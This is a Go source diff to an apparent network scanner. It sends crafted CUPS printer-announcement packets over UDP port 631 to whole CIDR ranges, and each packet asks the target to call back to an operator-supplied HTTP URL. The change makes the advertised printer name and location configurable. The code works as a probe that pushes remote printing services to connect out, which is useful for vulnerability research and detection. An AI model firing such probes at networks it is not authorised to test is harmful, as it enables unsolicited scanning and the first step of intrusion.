@@ -30,12 +30,14 @@ var (
 		Use: "prod",
 	}
 
-	network  = prodCmd.Flags().String("network", "127.0.0.1/32", "CIDR network to scan, can be a file with many CIDRs (autodetects)")
-	parallel = prodCmd.Flags().Int("parallel", runtime.NumCPU(), "how many packets to send in parallel")
-	delay    = prodCmd.Flags().Int("delay", 0, "millisecond delay between each packet per thread")
-	url      = prodCmd.Flags().String("url", "http://localhost/printers/JUGULAR", "your http callback address")
-	myip     = prodCmd.Flags().String("ip", "", "this machines own IP addresss")
-	addip    = prodCmd.Flags().Bool("addip", true, "add the target IP to the url")
+	network     = prodCmd.Flags().String("network", "127.0.0.1/32", "CIDR network to scan, can be a file with many CIDRs (autodetects)")
+	parallel    = prodCmd.Flags().Int("parallel", runtime.NumCPU(), "how many packets to send in parallel")
+	delay       = prodCmd.Flags().Int("delay", 0, "millisecond delay between each packet per thread")
+	url         = prodCmd.Flags().String("url", "http://localhost/printers/JUGULAR", "your http callback address")
+	printername = prodCmd.Flags().String("printername", "Jugular 2000", "printer name to send")
+	location    = prodCmd.Flags().String("location", "Reboot HQ", "printer location to send")
+	myip        = prodCmd.Flags().String("ip", "", "this machines own IP addresss")
+	addip       = prodCmd.Flags().Bool("addip", true, "add the target IP to the url")
 
 	listenCmd = cobra.Command{
 		Use: "listen",
@@ -116,16 +118,15 @@ func prod(cmd *cobra.Command, args []string) error {
 				DstPort: 631,
 			}
 			udp.SetNetworkLayerForChecksum(&ipv4)
+			payload := fmt.Sprintf(`%x %x %s "%s" "%s"`, 0x00, 0x03, *url, *location, *printername)
 
 			for ip := range queue {
 				// create packet
 				ipv4.DstIP = net.ParseIP(ip)
 
-				myurl := *url
 				if *addip {
-					myurl += "-" + ip
+					payload = fmt.Sprintf(`%x %x %s "%s" "%s"`, 0x00, 0x03, *url+"-"+ip, *location, *printername)
 				}
-				payload := fmt.Sprintf(`%x %x %s "%s" "%s"`, 0x00, 0x03, myurl, "Reboot HQ", "Jugular 2000")
 
 				buffer.Clear()
 				if err = gopacket.SerializeLayers(buffer, options,
